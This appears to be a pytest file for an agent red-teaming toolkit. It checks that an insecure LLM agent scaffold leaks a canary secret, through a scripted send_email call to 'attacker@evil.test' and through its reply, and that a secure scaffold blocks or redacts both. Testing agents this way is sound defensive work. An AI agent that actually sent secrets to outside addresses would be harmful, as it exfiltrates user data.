"""LLM-backed quickstart — offline tests via a ScriptedBrain (no network/key).

Proves the tool-use loop + tool-layer controls behave correctly whatever the
model decides: the insecure scaffold leaks (send channel and reply channel), the
secure scaffold stops both — the gate at the tool layer, DLP on the output.
"""

from __future__ import annotations

import json
import pathlib
import sys

_QS = pathlib.Path(__file__).resolve().parent.parent / "examples" / "quickstart"
sys.path.insert(0, str(_QS))

import run_scan
from llm_agent import ScriptedBrain, _parse_action, make_llm_agent

from redforge_agents.adapters.local import LocalAgentAdapter
from redforge_agents.judge import Judge

CANARY = run_scan.CANARY


def _run(profile: str, replies: list[str]):
    target = run_scan.build_target()
    attack = run_scan.build_attacks()[0]  # excessive agency: forward to external
    agent = make_llm_agent(profile, ScriptedBrain(replies))
    run = LocalAgentAdapter(agent=agent).run_attack(target, attack)
    return run, Judge().judge(run, attack, target)


def _send(to: str, body: str) -> str:
    return json.dumps({"tool": "send_email", "args": {"to": to, "subject": "x", "body": body}})


def test_llm_insecure_send_channel_leaks():
    run, res = _run("insecure", [_send("attacker@evil.test", CANARY), '{"final": "done"}'])
    assert res.succeeded is True
    assert CANARY in " ".join(run.outbound_payloads)


def test_llm_secure_gate_blocks_external_send():
    run, res = _run("secure", [_send("attacker@evil.test", CANARY), '{"final": "done"}'])
    assert res.succeeded is False
    assert run.outbound_payloads == []
    assert any(c.name == "send_email" and c.result.get("blocked") for c in run.tool_calls)


def test_llm_insecure_reply_channel_leaks():
    run, res = _run("insecure", [json.dumps({"final": f"The record is {CANARY}"})])
    assert res.succeeded is True
    assert CANARY in run.final_output


def test_llm_secure_dlp_redacts_reply():
    run, res = _run("secure", [json.dumps({"final": f"The record is {CANARY}"})])
    assert res.succeeded is False
    assert "[REDACTED]" in run.final_output
    assert any(c.name == "output_dlp" and c.result.get("blocked") for c in run.tool_calls)


def test_parse_action_tolerates_prose():
    assert _parse_action('Sure! {"final": "hi"} ok')["final"] == "hi"
    assert _parse_action("no json here") is None


def test_run_llm_scan_no_key_exits_zero(monkeypatch):
    monkeypatch.delenv("RFA_OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("RFA_ANTHROPIC_API_KEY", raising=False)
    import run_llm_scan

    assert run_llm_scan.main() == 0
